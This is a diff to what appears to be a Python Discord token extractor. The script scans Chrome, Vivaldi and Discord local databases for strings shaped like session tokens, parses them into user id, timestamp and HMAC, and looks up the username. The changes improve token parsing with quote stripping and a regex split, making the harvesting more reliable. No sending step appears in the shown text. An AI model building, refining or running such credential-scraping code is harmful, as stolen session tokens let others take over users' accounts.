@@ -9,6 +9,7 @@ from functools import cache
 from datetime import datetime
 from collections import namedtuple
 from typing import Optional, Iterator, List
+import re
 
 ParsedToken = namedtuple("ParsedToken", ["raw", "userid", "created", "hmac"])
 DB_FILTER = ["chrome", "vivaldi", "discord"]
@@ -48,7 +49,7 @@ def id2username(id: str) -> str:
         data = json.load(resp)
         return data.get("username") or "Unknown"
     except:
-        return "Unkown"
+        return "Unknown"
 
 
 def parseIdPart(id_part: str) -> str:
@@ -121,12 +122,15 @@ def main():
     for database in discord_databases:
         for candidates in map(lambda s: s.split(), strings(database, 40)):
             for candidate in candidates:
-                candidate = candidate[1:-1]
+                try:
+                    candidate = candidate.split('"')[-2]
+                except:
+                    pass
                 if len(candidate) < 15:
                     continue
                 if " " in candidate:
                     continue
-                parts = candidate.split(".")
+                parts = re.split(r"(?<=\w)\.(?=\w)", candidate)
                 if len(parts) != 3:
                     continue
                 if len(parts[1]) < 6:
